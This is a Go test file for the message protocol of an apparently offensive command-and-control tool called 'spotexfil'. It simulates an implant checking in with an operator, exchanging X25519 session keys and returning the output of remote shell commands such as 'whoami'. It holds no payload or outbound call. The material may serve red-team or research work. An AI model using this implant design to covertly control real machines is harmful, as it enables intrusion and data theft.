package protocol

import (
	"testing"

	"github.com/sourcefrenchy/spotexfil/internal/crypto"
)

// --- EncodeMessageRaw / DecodeMessageRaw tests ---

func TestEncodeDecodeMessageRaw(t *testing.T) {
	// Generate a raw 32-byte key (simulating ECDH-derived session key)
	priv, _ := crypto.GenerateX25519()
	privB, _ := crypto.GenerateX25519()
	shared, _ := priv.ECDH(privB.PublicKey())
	rawKey, _ := crypto.DeriveSessionKey(shared, "master")

	msg := map[string]interface{}{
		"module": "shell",
		"seq":    float64(1),
		"data":   "hello world",
	}

	encoded, err := EncodeMessageRaw(msg, rawKey)
	if err != nil {
		t.Fatalf("encode raw: %v", err)
	}

	decoded, err := DecodeMessageRaw(encoded, rawKey)
	if err != nil {
		t.Fatalf("decode raw: %v", err)
	}

	if getString(decoded, "module") != "shell" {
		t.Errorf("module: got %v", decoded["module"])
	}
	if getString(decoded, "data") != "hello world" {
		t.Errorf("data: got %v", decoded["data"])
	}
}

func TestRawWrongKeyFails(t *testing.T) {
	key1 := make([]byte, 32)
	key2 := make([]byte, 32)
	key1[0] = 1
	key2[0] = 2

	msg := map[string]interface{}{"module": "test", "seq": float64(1)}
	encoded, _ := EncodeMessageRaw(msg, key1)

	_, err := DecodeMessageRaw(encoded, key2)
	if err == nil {
		t.Error("expected error decoding with wrong key")
	}
}

func TestMasterKeyCannotDecryptSessionKey(t *testing.T) {
	// Encrypt with raw session key
	priv, _ := crypto.GenerateX25519()
	privB, _ := crypto.GenerateX25519()
	shared, _ := priv.ECDH(privB.PublicKey())
	sessionKey, _ := crypto.DeriveSessionKey(shared, "master-pass")

	msg := map[string]interface{}{"module": "shell", "seq": float64(1)}
	encoded, _ := EncodeMessageRaw(msg, sessionKey)

	// Master key cannot decrypt session-key-encrypted message
	_, err := DecodeMessage(encoded, "master-pass")
	if err == nil {
		t.Error("master key should NOT decrypt session-key-encrypted message")
	}
}

// --- Resilience scenario tests ---

func TestKeyExchangeSimulation(t *testing.T) {
	masterKey := "shared-passphrase"

	// Step 1: Implant sends checkin (encrypted with master key)
	checkin := map[string]interface{}{
		"module": "checkin",
		"seq":    float64(0),
		"status": "ok",
		"data":   `{"client_id":"abc123"}`,
	}
	checkinEnc, err := EncodeMessage(checkin, masterKey)
	if err != nil {
		t.Fatalf("encode checkin: %v", err)
	}

	// Operator decodes checkin with master key
	checkinDec, err := DecodeMessage(checkinEnc, masterKey)
	if err != nil {
		t.Fatalf("decode checkin: %v", err)
	}
	if getString(checkinDec, "module") != "checkin" {
		t.Error("checkin module mismatch")
	}

	// Step 2: Operator sends keyexchange (master key)
	kexCmd := map[string]interface{}{
		"module": "keyexchange",
		"seq":    float64(1),
		"pubkey": "deadbeef",
	}
	kexEnc, err := EncodeMessage(kexCmd, masterKey)
	if err != nil {
		t.Fatalf("encode kex: %v", err)
	}

	// Implant decodes keyexchange with master key
	kexDec, err := DecodeMessage(kexEnc, masterKey)
	if err != nil {
		t.Fatalf("decode kex: %v", err)
	}
	if getString(kexDec, "module") != "keyexchange" {
		t.Error("kex module mismatch")
	}

	// Step 3: Both sides derive session key
	privA, _ := crypto.GenerateX25519()
	privB, _ := crypto.GenerateX25519()
	sharedA, _ := privA.ECDH(privB.PublicKey())
	sharedB, _ := privB.ECDH(privA.PublicKey())
	sessionA, _ := crypto.DeriveSessionKey(sharedA, masterKey)
	sessionB, _ := crypto.DeriveSessionKey(sharedB, masterKey)

	if string(sessionA) != string(sessionB) {
		t.Fatal("session keys don't match")
	}

	// Step 4: Implant sends result encrypted with session key
	result := map[string]interface{}{
		"module": "shell",
		"seq":    float64(2),
		"status": "ok",
		"data":   "uid=0(root)",
	}
	resultEnc, err := EncodeMessageRaw(result, sessionA)
	if err != nil {
		t.Fatalf("encode result: %v", err)
	}

	// Operator decodes result with session key
	resultDec, err := DecodeMessageRaw(resultEnc, sessionB)
	if err != nil {
		t.Fatalf("decode result: %v", err)
	}
	if getString(resultDec, "data") != "uid=0(root)" {
		t.Errorf("data: got %v", resultDec["data"])
	}

	// Master key CANNOT decode the result (forward secrecy)
	_, err = DecodeMessage(resultEnc, masterKey)
	if err == nil {
		t.Error("master key should NOT decrypt session-encrypted result")
	}
}

func TestOperatorRestartScenario(t *testing.T) {
	masterKey := "persistent-key"

	// Operator session 1: sends a command with master key
	cmd1 := map[string]interface{}{
		"module": "shell",
		"seq":    float64(1),
		"args":   map[string]interface{}{"cmd": "ps"},
	}
	cmd1Enc, _ := EncodeMessage(cmd1, masterKey)

	// Implant decodes with master key (no session key yet)
	cmd1Dec, err := DecodeMessage(cmd1Enc, masterKey)
	if err != nil {
		t.Fatalf("implant decode cmd1: %v", err)
	}
	if getString(cmd1Dec, "module") != "shell" {
		t.Error("cmd1 module mismatch")
	}

	// Operator restarts (new instance, same master key)
	// Sends another command with master key
	cmd2 := map[string]interface{}{
		"module": "shell",
		"seq":    float64(2),
		"args":   map[string]interface{}{"cmd": "whoami"},
	}
	cmd2Enc, _ := EncodeMessage(cmd2, masterKey)

	// Implant decodes with master key (still works)
	cmd2Dec, err := DecodeMessage(cmd2Enc, masterKey)
	if err != nil {
		t.Fatalf("implant decode cmd2: %v", err)
	}
	if getString(cmd2Dec, "module") != "shell" {
		t.Error("cmd2 module mismatch")
	}
}

func TestImplantFallbackDecryption(t *testing.T) {
	masterKey := "master"

	// Derive a session key
	privA, _ := crypto.GenerateX25519()
	privB, _ := crypto.GenerateX25519()
	shared, _ := privA.ECDH(privB.PublicKey())
	sessionKey, _ := crypto.DeriveSessionKey(shared, masterKey)

	// Command encrypted with master key (before key exchange)
	cmd := map[string]interface{}{"module": "shell", "seq": float64(1)}
	cmdMaster, _ := EncodeMessage(cmd, masterKey)

	// Command encrypted with session key (after key exchange)
	cmdSession, _ := EncodeMessageRaw(cmd, sessionKey)

	// Implant should decode both:
	// 1. Try session key first
	_, err := DecodeMessageRaw(cmdMaster, sessionKey)
	masterFailed := err != nil

	// 2. If session key fails, try master key
	if masterFailed {
		_, err = DecodeMessage(cmdMaster, masterKey)
		if err != nil {
			t.Fatal("master key fallback failed")
		}
	}

	// Session-encrypted command works with session key
	_, err = DecodeMessageRaw(cmdSession, sessionKey)
	if err != nil {
		t.Fatal("session key decode failed")
	}
}

func TestPubKeyInMessage(t *testing.T) {
	msg := NewC2Message("keyexchange", 1)
	msg.PubKey = "abcdef1234567890"

	cmdMap := msg.ToCommandMap()
	if cmdMap["pubkey"] != "abcdef1234567890" {
		t.Error("pubkey not in command map")
	}

	restored := FromCommandMap(cmdMap)
	if restored.PubKey != "abcdef1234567890" {
		t.Errorf("pubkey roundtrip: got %s", restored.PubKey)
	}

	// Result map
	msg.Status = "ok"
	resMap := msg.ToResultMap()
	if resMap["pubkey"] != "abcdef1234567890" {
		t.Error("pubkey not in result map")
	}
	restoredR := FromResultMap(resMap)
	if restoredR.PubKey != "abcdef1234567890" {
		t.Errorf("pubkey result roundtrip: got %s", restoredR.PubKey)
	}
}
